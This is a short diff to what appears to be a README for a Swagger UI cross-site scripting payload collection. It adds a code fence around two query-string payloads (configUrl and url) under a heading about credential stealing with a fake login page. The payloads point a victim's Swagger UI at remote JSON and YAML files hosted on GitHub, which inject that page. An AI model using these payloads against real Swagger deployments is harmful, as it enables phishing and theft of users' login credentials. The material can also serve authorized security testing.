@@ -7,5 +7,7 @@
 ````
 
 # Credentails stealing using fake login page
+```
 ?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/form/xss_cred_steal.json
 ?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/form/xss_cred_steal.yaml
+```
